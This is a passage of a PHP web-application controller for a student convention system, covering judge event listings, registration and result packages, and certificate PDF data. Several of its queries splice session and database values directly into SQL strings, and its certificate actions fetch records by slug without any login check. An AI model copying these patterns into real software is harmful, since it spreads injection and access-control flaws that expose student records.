		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$this->set('active_cr_judgeevents','active');
			
			$conventionRegD = $this->Conventionregistrations->find()->where(['Conventionregistrations.id' => $this->request->session()->read("sess_selected_convention_registration_id")])->contain(['Conventions'])->first();
			$this->set('conventionRegD', $conventionRegD);
			//echo $this->request->session()->read("sess_selected_convention_registration_id");exit;
			
			//To list all events that selecyed for this conv season
			if(!empty($conventionRegD->judges_event_ids))
			{
				$condition[] = "(Events.id IN ($conventionRegD->judges_event_ids))";
			}
			$condition[] = "(Events.status  = '1')";
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}
		
		//$this->prx($condition);
		
		$events = $this->Events->find()->where($condition)->order(['Events.event_id_number' => 'ASC','Events.event_name' => 'ASC'])->all();
		$this->set('events',$events);
    }
	
	public function judgeevententries($conv_reg_slug=null,$event_slug=null) {

        $this->userLoginCheck();
        $this->multiLoginCheck(['Teacher_Parent','Judge']);
		
        $this->set("title_for_layout", "Event Entries" . TITLE_FOR_PAGES);
        $this->viewbuilder()->layout('home');
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$this->set('active_cr_judgeevents','active');
		}
		else
		{
			$this->set('active_convention_registrations','active');
		}
		
		$this->set('conv_reg_slug',$conv_reg_slug);
		
        $msgString = '';

		$user_id = $this->request->session()->read("user_id");
		$user_type 	= $this->request->session()->read("user_type");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);
		
		//$this->prx($userDetails);
		
		$conventionRegD = $this->Conventionregistrations->find()->where(['Conventionregistrations.slug' => $conv_reg_slug])->contain(['Conventions'])->first();
		//$this->prx($conventionRegD);
		$this->set('conventionRegD', $conventionRegD);
		if($conventionRegD->status == 2)
		{
			$this->Flash->error('Sorry, admin has not approved these events yet. You will receive an email and entries will be visible once approved.');
			$this->redirect(['controller' => 'conventionregistrations', 'action' => 'judgeevents',$conv_reg_slug]);
		}
		else
		if($conventionRegD->status == 0)
		{
			$this->Flash->error('Sorry, admin declined your registration. Please contact events team.');
			$this->redirect(['controller' => 'conventionregistrations', 'action' => 'judgeevents',$conv_reg_slug]);
		}
		
		
		$eventD = $this->Events->find()->where(['Events.slug' => $event_slug])->first();
		$this->set('eventD', $eventD);

        $condition = array();
		//$condition[] = "(Eventsubmissions.conventionregistration_id = '".$conventionRegD->id."')";
		//$condition[] = "(Eventsubmissions.conventionseason_id = '".$conventionRegD->conventionseason_id."')";
		$condition[] = "(Eventsubmissions.convention_id = '".$conventionRegD->convention_id."')";
		$condition[] = "(Eventsubmissions.season_id = '".$conventionRegD->season_id."')";
		$condition[] = "(Eventsubmissions.season_year = '".$conventionRegD->season_year."')";
		$condition[] = "(Eventsubmissions.event_id = '".$eventD->id."')";
		
		//$this->prx($condition);
		
		if($eventD->group_event_yes_no == 1)
		{
			$condition[] = "(Eventsubmissions.student_id = '0')";
		}
		else
		{
			$condition[] = "(Eventsubmissions.student_id >0)";
		}
		
		//$this->prx($condition);
		
		$eventsubmissions = $this->Eventsubmissions->find()->where($condition)->contain(["Students","Users"])->order(['Eventsubmissions.id' => 'DESC'])->all();
		$this->set('eventsubmissions',$eventsubmissions);
		
		// here to get conv reg slug for back button
		$condBackButton = array();
		$condBackButton[] = "(Conventionregistrations.conventionseason_id = '".$conventionRegD->conventionseason_id."')";
		$condBackButton[] = "(Conventionregistrations.convention_id = '".$conventionRegD->convention_id."')";
		$condBackButton[] = "(Conventionregistrations.user_id = '".$user_id."')";
		$condBackButton[] = "(Conventionregistrations.season_id = '".$conventionRegD->season_id."')";
		$condBackButton[] = "(Conventionregistrations.season_year = '".$conventionRegD->season_year."')";
		$convBackBtn = $this->Conventionregistrations->find()->where($condBackButton)->first();
		//$this->prx($convBackBtn);
		$this->set('convBackBtn',$convBackBtn);
    }
	
	public function packageregistration() {

        $this->userLoginCheck();
        $this->multiLoginCheck(array("School","Teacher_Parent"));
		
        $this->set("title_for_layout", "Registration Checklist" . TITLE_FOR_PAGES);
        $this->viewbuilder()->layout('home');
        
		$this->set('active_cr_packageregistration','active');
		
        $msgString = '';

		$user_id 	= $this->request->session()->read("user_id");
		$user_type 	= $this->request->session()->read("user_type");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);

        $condition = array();
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$condition[] = "(Conventionregistrationstudents.conventionregistration_id = '".$this->request->session()->read("sess_selected_convention_registration_id")."')";

			// if teacher/supervisor logged in, then only show students assigned to him
			if($user_type == "Teacher_Parent")
			{
				$condition[] = "(Conventionregistrationstudents.teacher_parent_id = '".$user_id."')";
			}
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}
		
		$packageregistration = $this->Conventionregistrationstudents->find()->where($condition)->contain(['Conventions','Students'])->order(['Conventionregistrationstudents.season_year' => 'DESC'])->all();
		$this->set('packageregistration',$packageregistration);
		
    }
	
	public function packageregistrationprint() {

        $this->userLoginCheck();
        $this->multiLoginCheck(array("School","Teacher_Parent"));
		
        $this->set("title_for_layout", "Package Registration" . TITLE_FOR_PAGES);
        $this->viewbuilder()->layout('print_reports');

		$user_id 	= $this->request->session()->read("user_id");
		$user_type 	= $this->request->session()->read("user_type");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);
		
        $condition = array();
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$condition[] = "(Conventionregistrationstudents.conventionregistration_id = '".$this->request->session()->read("sess_selected_convention_registration_id")."')";
			
			// if teacher/supervisor logged in, then only show students assigned to him
			if($user_type == "Teacher_Parent")
			{
				$condition[] = "(Conventionregistrationstudents.teacher_parent_id = '".$user_id."')";
			}
			
			$conventionRegD = $this->Conventionregistrations->find()->where(['Conventionregistrations.id' => $this->request->session()->read("sess_selected_convention_registration_id")])->contain(['Conventions'])->first();
			$this->set('conventionRegD', $conventionRegD);
			//$this->prx($conventionRegD);
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}
		
		//echo $this->request->session()->read("sess_selected_convention_registration_id");
		
		//$this->prx($condition);
		
		$packageregistration = $this->Conventionregistrationstudents->find()->where($condition)->contain(['Conventions','Students'])->order(['Conventionregistrationstudents.season_year' => 'DESC'])->all();
		$this->set('packageregistration',$packageregistration);
		
    }
	
	public function resultpackage() {

        $this->userLoginCheck();
        $this->multiLoginCheck(array("School"));
		
        $this->set("title_for_layout", "Result Package" . TITLE_FOR_PAGES);
        $this->viewbuilder()->layout('home');
        
		$this->set('active_cr_resultpackage','active');
		
        $msgString = '';

		$user_id 	= $this->request->session()->read("user_id");
		$user_type 	= $this->request->session()->read("user_type");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);

        $condition = array();
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$conventionRegD = $this->Conventionregistrations->find()->where(['Conventionregistrations.id' => $this->request->session()->read("sess_selected_convention_registration_id")])->contain(['Conventions','Conventionseasons'])->first();
			$this->set('conventionRegD', $conventionRegD);

			
			// to check if results released
			if($conventionRegD->Conventionseasons['results_release'] == 0)
			{
				$this->Flash->error('Sorry, results not yet released by admin.');
				$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
			}
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}
		
		
		// First to get list of all events for this conv + seasons
		$arrConvSeasonEvent = array();
		$arrConvSeasonEvent[] = 0;
		
		$allEventsConvSeason = $this->Conventionseasonevents->find()->where(['Conventionseasonevents.conventionseasons_id' => $conventionRegD->conventionseason_id])->all();
		foreach($allEventsConvSeason as $convevent)
		{
			$arrConvSeasonEvent[] = $convevent->event_id;
		}
		//$arrConvSeasonEvent[] = 173;
		
		$this->set('arrConvSeasonEvent', $arrConvSeasonEvent);
		
		//$this->prx($arrConvSeasonEvent);
		
    }
	
	public function resultpackageprint() {

        $this->userLoginCheck();
        $this->multiLoginCheck(array("School"));
		
        $this->set("title_for_layout", "Result Package" . TITLE_FOR_PAGES);
        $this->viewbuilder()->layout('print_reports');
        
		$this->set('active_cr_resultpackage','active');
		
        $msgString = '';

		$user_id 	= $this->request->session()->read("user_id");
		$user_type 	= $this->request->session()->read("user_type");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);

        $condition = array();
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$conventionRegD = $this->Conventionregistrations->find()->where(['Conventionregistrations.id' => $this->request->session()->read("sess_selected_convention_registration_id")])->contain(['Conventions'])->first();
			$this->set('conventionRegD', $conventionRegD);
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}
		
		
		// First to get list of all events for this conv + seasons
		$arrConvSeasonEvent = array();
		$arrConvSeasonEvent[] = 0;
		
		$allEventsConvSeason = $this->Conventionseasonevents->find()->where(['Conventionseasonevents.conventionseasons_id' => $conventionRegD->conventionseason_id])->all();
		foreach($allEventsConvSeason as $convevent)
		{
			$arrConvSeasonEvent[] = $convevent->event_id;
		}
		
		$this->set('arrConvSeasonEvent', $arrConvSeasonEvent);
		
		//$this->prx($arrConvSeasonEvent);
		
    }
	
	
	/*Individual report*/
	public function resultpackageindividual() {

        $this->userLoginCheck();
        $this->multiLoginCheck(array("School"));
		
        $this->set("title_for_layout", "Result Package Individual Student" . TITLE_FOR_PAGES);
        $this->viewbuilder()->layout('home');
        
		$this->set('active_cr_resultpackage','active');
		
        $msgString = '';

		$user_id 	= $this->request->session()->read("user_id");
		$user_type 	= $this->request->session()->read("user_type");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);

        $condition = array();
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$conventionRegD = $this->Conventionregistrations->find()->where(['Conventionregistrations.id' => $this->request->session()->read("sess_selected_convention_registration_id")])->contain(['Conventions','Conventionseasons'])->first();
			$this->set('conventionRegD', $conventionRegD);
			
			// to check if results released
			if($conventionRegD->Conventionseasons['results_release'] == 0)
			{
				$this->Flash->error('Sorry, results not yet released by admin.');
				$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
			}
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}
		
		//To get list of students for this school who get any position
		$arrStudentsSchool = array();
		$studentpositions = $this->Resultpositions->find()->where(["Resultpositions.user_id" => $userDetails->id,"Resultpositions.student_id >" => 0,"Resultpositions.conventionseason_id" => $conventionRegD->conventionseason_id,"Resultpositions.position >" => 0,"Resultpositions.position <=" => 6])->order(["Resultpositions.position" => "ASC"])->all();
		foreach($studentpositions as $stpos)
		{
			if(!in_array($stpos->student_id,(array)$arrStudentsSchool))
			{
				$arrStudentsSchool[] = $stpos->student_id;
			}
		}
		
		$this->set('arrStudentsSchool', $arrStudentsSchool);
		
		//$this->prx($arrStudentsSchool);
		
    }
	
	public function resultpackageindividualprint() {

        $this->userLoginCheck();
        $this->multiLoginCheck(array("School"));
		
        $this->set("title_for_layout", "Result Package Individual Student" . TITLE_FOR_PAGES);
        $this->viewbuilder()->layout('print_reports');
        
		$this->set('active_cr_resultpackage','active');
		$this->set('show_header_each_page',1);
		
        $msgString = '';

		$user_id 	= $this->request->session()->read("user_id");
		$user_type 	= $this->request->session()->read("user_type");
		$userDetails = $this->Users->find()->where(['Users.id' => $user_id])->first();
        $this->set('userDetails', $userDetails);

        $condition = array();
		
		if($this->request->session()->read("sess_selected_convention_registration_id")>0)
		{
			$conventionRegD = $this->Conventionregistrations->find()->where(['Conventionregistrations.id' => $this->request->session()->read("sess_selected_convention_registration_id")])->contain(['Conventions','Conventionseasons'])->first();
			$this->set('conventionRegD', $conventionRegD);
			
			// to check if results released
			if($conventionRegD->Conventionseasons['results_release'] == 0)
			{
				$this->Flash->error('Sorry, results not yet released by admin.');
				$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
			}
		}
		else
		{
			$this->Flash->error('Please choose convention registration first.');
			$this->redirect(['controller' => 'users', 'action' => 'dashboard']);
		}
		
		//To get list of students for this school who get any position
		$arrStudentsSchool = array();
		$studentpositions = $this->Resultpositions->find()->where(["Resultpositions.user_id" => $userDetails->id,"Resultpositions.student_id >" => 0,"Resultpositions.conventionseason_id" => $conventionRegD->conventionseason_id,"Resultpositions.position >" => 0,"Resultpositions.position <=" => 6])->order(["Resultpositions.position" => "ASC"])->all();
		foreach($studentpositions as $stpos)
		{
			if(!in_array($stpos->student_id,(array)$arrStudentsSchool))
			{
				$arrStudentsSchool[] = $stpos->student_id;
			}
		}
		
		$this->set('arrStudentsSchool', $arrStudentsSchool);
		
		//$this->prx($arrStudentsSchool);
		
		// to set page break
		$this->set('page_break','yes');
		
    }
	
	public function scriptureawardpdf($conv_reg_student_slug = null) {
		
		//$this->helpers[] = 'Pdf';
		
		$this->viewbuilder()->layout('');
		
		$convRegStudentD = $this->Conventionregistrationstudents->find()->where(['Conventionregistrationstudents.slug' => $conv_reg_student_slug])->contain(['Students','Users','Conventions'])->first();
		
		// to get event submission details of student so that we will get books
		$bookArr = array();
		$studentEventSub = $this->Eventsubmissions->find()->where(['Eventsubmissions.conventionregistration_id' => $convRegStudentD->conventionregistration_id,'Eventsubmissions.convention_id' => $convRegStudentD->convention_id,'Eventsubmissions.user_id' => $convRegStudentD->user_id,'Eventsubmissions.season_id' => $convRegStudentD->season_id,'Eventsubmissions.student_id' => $convRegStudentD->student_id])->first();
		
		$submission_book_ids = $studentEventSub->book_ids;
		if(!empty($submission_book_ids))
		{	
			// to get name of books
			$condBooks = array();
			$condBooks[] = "(Books.id IN ($submission_book_ids))";
			$booksList = $this->Books->find()->where($condBooks)->order(['Books.book_name' => 'ASC'])->all();
			foreach($booksList as $bookd)
			{
				$bookArr[] = $bookd->book_name;
			}
		}
		$bookNames = "";
		if(count((array)$bookArr))
		{
			$bookNames = implode(", ",$bookArr);
		}
		
		// if no book names found, no certificate will generate
		if(trim(empty($bookNames)))
		{
			$this->Flash->error('Sorry, book names not found. Please ensure that you have submitted event for this student.');
			$this->redirect(['controller' => 'conventionregistrations', 'action' => 'students']);
		}
		
		// to see if event is 1005 1055 Silver Apple Award, db id 336 and 342then grey certificate need to generate
		// .. otherwise yellow certificate
		//echo $studentEventSub->event_id;exit;
		
		// prepare an array for theme so that based on event id, theme will select
		$arrEventTheme = array();
		
		// for 1000 1050 Golden Apple Award
		$arrEventTheme['331']	= 	array(
										"header_image" => 'header_golden_apple_award.png',
										"footer_image" => 'footer_yellow.png',
										"border_color" => '#fbf0c2'
										);
		$arrEventTheme['337']	=	$arrEventTheme['331'];
		
		// for 1001 1051 Golden Lamb Award 
		$arrEventTheme['332']	= 	array(
										"header_image" => 'header_golden_lamp_award.png',
										"footer_image" => 'footer_yellow.png',
										"border_color" => '#fbf0c2'
										);
		$arrEventTheme['338']	=	$arrEventTheme['332'];
		
		// for 1002 1052 Golden Harp Award 
		$arrEventTheme['333']	= 	array(
										"header_image" => 'header_golden_harp_award.png',
										"footer_image" => 'footer_yellow.png',
										"border_color" => '#fbf0c2'
										);
		$arrEventTheme['339']	=	$arrEventTheme['333'];
		
		// for 1003 1053 Christian Soldier Award 
		$arrEventTheme['334']	= 	array(
										"header_image" => 'header_christian_soldier_award.png',
										"footer_image" => 'footer_yellow.png',
										"border_color" => '#fbf0c2'
										);
		$arrEventTheme['340']	=	$arrEventTheme['334'];
		
		// for 1004 1054 Christian Worker Award 
		$arrEventTheme['335']	= 	array(
										"header_image" => 'header_christian_worker_award.png',
										"footer_image" => 'footer_yellow.png',
										"border_color" => '#fbf0c2'
										);
		$arrEventTheme['341']	=	$arrEventTheme['335'];
		
		// for 1005 1055 Silver Apple Award
		$arrEventTheme['336']	= 	array(
										"header_image" => 'header_silver_apple_award.png',
										"footer_image" => 'footer_grey.png',
										"border_color" => '#d7d8da'
										);
		$arrEventTheme['342']	=	$arrEventTheme['336'];
		
		
		$certificateTheme	=	$arrEventTheme[$studentEventSub->event_id];
		$this->set('certificateTheme', $certificateTheme);
		
		//$this->prx($certificateTheme);
		
		// to prepare an arrayto send forpdf generation
		$arrCertData = array();
		
		$arrCertData['convention_name'] = $convRegStudentD['Conventions']['name'];
		
		$arrCertData['student_name'] 	= $convRegStudentD['Students']['first_name'];
		if(!empty($convRegStudentD['Students']['middle_name']))
		{
			$arrCertData['student_name'] .= ' '.$convRegStudentD['Students']['middle_name'];
		}
		if(!empty($convRegStudentD['Students']['last_name']))
		{
			$arrCertData['student_name'] .= ' '.$convRegStudentD['Students']['last_name'];
		}
		
		$arrCertData['school_name'] = $convRegStudentD['Users']['first_name'];
		$arrCertData['book_names'] 	= $bookNames;
		
		$this->set('arrCertData', $arrCertData);
		
		
		//$this->prx($arrCertData);
		
		ini_set('memory_limit', '512M');
        set_time_limit(0);
		
	}
	
	public function participationcertificatepdf($resultpositions_slug = null) {
		
		//$this->helpers[] = 'Pdf';
		
		$this->viewbuilder()->layout('');
		
		$resultPositionD = $this->Resultpositions->find()->where(['Resultpositions.slug' => $resultpositions_slug])->contain(['Students','Users','Conventions'])->first();
		
		
		
		// to prepare an array to send for pdf generation
		$arrCertData = array();
		
		$arrCertData['convention_name'] = $resultPositionD->Conventions['name'];
		
		$arrCertData['student_name'] 	= $resultPositionD->Students['first_name'];
		if(!empty($resultPositionD->Students['middle_name']))
		{
			$arrCertData['student_name'] .= ' '.$resultPositionD->Students['middle_name'];
		}
		if(!empty($resultPositionD->Students['last_name']))
		{
			$arrCertData['student_name'] .= ' '.$resultPositionD->Students['last_name'];
		}
		
		$arrCertData['school_name'] = $resultPositionD->Users['first_name'];
		$arrCertData['season_year'] = $resultPositionD->season_year;
		
		$this->set('arrCertData', $arrCertData);
		
		
		//$this->prx($arrCertData);
		
		ini_set('memory_limit', '512M');
        set_time_limit(0);
		
	}
	
	public function placecertificatepdf($resultpositions_slug = null, $position=null) {
		
		//$this->helpers[] = 'Pdf';
		
		$this->viewbuilder()->layout('');
		
		$resultPositionD = $this->Resultpositions->find()->where(['Resultpositions.slug' => $resultpositions_slug])->contain(['Students','Users','Conventions','Events'])->first();
		
		global $resultPositions;
		$this->set('resultPositions', $resultPositions);
		
		// to prepare an array to send for pdf generation
		$arrCertData = array();
		
		$arrCertData['convention_name'] = $resultPositionD->Conventions['name'];
		
		$arrCertData['student_name'] 	= $resultPositionD->Students['first_name'];
		if(!empty($resultPositionD->Students['middle_name']))
		{
			$arrCertData['student_name'] .= ' '.$resultPositionD->Students['middle_name'];
		}
		if(!empty($resultPositionD->Students['last_name']))
		{
			$arrCertData['student_name'] .= ' '.$resultPositionD->Students['last_name'];
		}
		
		$arrCertData['school_name'] = $resultPositionD->Users['first_name'];
		$arrCertData['season_year'] = $resultPositionD->season_year;
		$arrCertData['position'] 	= $position;
		$arrCertData['event_name'] 	= $resultPositionD->Events['event_name'];
		
		$this->set('arrCertData', $arrCertData);
		
		
		//$this->prx($arrCertData);
		
		ini_set('memory_limit', '512M');
        set_time_limit(0);
		
	}

}

?>
